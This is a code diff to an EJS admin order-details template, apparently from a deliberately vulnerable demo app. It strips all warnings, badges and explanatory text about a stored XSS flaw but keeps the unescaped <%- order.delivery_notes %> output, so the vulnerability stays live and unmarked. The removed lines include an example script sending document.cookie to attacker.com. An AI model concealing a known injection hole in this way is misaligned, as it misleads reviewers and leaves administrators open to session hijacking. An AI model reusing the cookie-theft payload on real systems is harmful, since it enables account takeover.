@@ -23,15 +23,7 @@
                 </div>
             </div>
 
-            <!-- XSS VULNERABILITY WARNING -->
-            <div class="xss-warning">
-                <h4>
-                    <i class="fas fa-exclamation-triangle"></i> CRITICAL SECURITY VULNERABILITY
-                </h4>
-                <p>This page contains a <strong>deliberate XSS vulnerability</strong>. The delivery notes below are rendered using <code><%- %></code> (unescaped output) instead of <code><%= %></code> (escaped output).</p>
-                <p><strong>Vulnerable line:</strong> <code><div class="notes-display"><%- order.delivery_notes %></div></code></p>
-                <p><strong>Impact:</strong> Any script injected into delivery notes will execute when an admin views this page.</p>
-            </div>
+            <!-- Admin view: order details -->
 
             <div class="order-details-card">
                 <!-- Order Information -->
@@ -70,17 +62,10 @@
                 <div class="order-info-section">
                     <h3>
                         <i class="fas fa-sticky-note"></i> Delivery Notes
-                        <span class="badge badge-danger" style="background-color: var(--danger-color); color: white; padding: 0.25rem 0.5rem; border-radius: 4px; font-size: 0.75rem; margin-left: 0.5rem;">
-                            XSS VULNERABLE
-                        </span>
                     </h3>
                     <div class="notes-display">
                         <%- order.delivery_notes %>
                     </div>
-                    <p class="text-muted mt-2">
-                        <i class="fas fa-exclamation-triangle"></i> 
-                        <strong>VULNERABLE:</strong> This field uses <code><%- %></code> (unescaped output) - allows script execution
-                    </p>
                 </div>
 
                 <!-- Order Items -->
@@ -160,43 +145,8 @@
                     </h3>
                 </div>
                 <div class="card-body">
-                    <h4>Technical Details:</h4>
-                    <p>The vulnerability occurs because user input (delivery notes) is rendered without proper HTML encoding:</p>
-                    
-                    <div class="code-comparison" style="display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 1.5rem; margin: 1.5rem 0;">
-                        <div>
-                            <h5><span class="badge badge-danger">VULNERABLE</span></h5>
-                            <pre><code><div class="notes-display">
-  <%- order.delivery_notes %>
-</div></code></pre>
-                            <p><strong>Problem:</strong> <code><%- %></code> outputs raw HTML, allowing script execution.</p>
-                        </div>
-                        <div>
-                            <h5><span class="badge badge-success">SAFE</span></h5>
-                            <pre><code><div class="notes-display">
-  <%= order.delivery_notes %>
-</div></code></pre>
-                            <p><strong>Solution:</strong> <code><%= %></code> encodes HTML entities, preventing XSS.</p>
-                        </div>
-                    </div>
-
-                    <h4>Example Attack Scenario:</h4>
-                    <ol>
-                        <li>Attacker creates account and places order with malicious delivery notes:
-                            <pre><code><script>
-  fetch('http://attacker.com/steal?cookie=' + document.cookie);
-</script></code></pre>
-                        </li>
-                        <li>Admin views order details (or admin bot automatically visits)</li>
-                        <li>Script executes in admin context, stealing session cookie</li>
-                        <li>Attacker receives cookie and can hijack admin session</li>
-                    </ol>
-
-                    <div class="security-warning mt-3">
-                        <i class="fas fa-shield-alt"></i>
-                        <strong>Prevention:</strong> Always use proper output encoding (<code><%= %></code> in EJS), 
-                        validate and sanitize user input, implement Content Security Policy (CSP), and use secure coding practices.
-                    </div>
+                    <h4>Notes</h4>
+                    <p>Review delivery notes as entered by customers. For presentations, demonstrations of security topics are coordinated separately.</p>
                 </div>
             </div>
         </div>
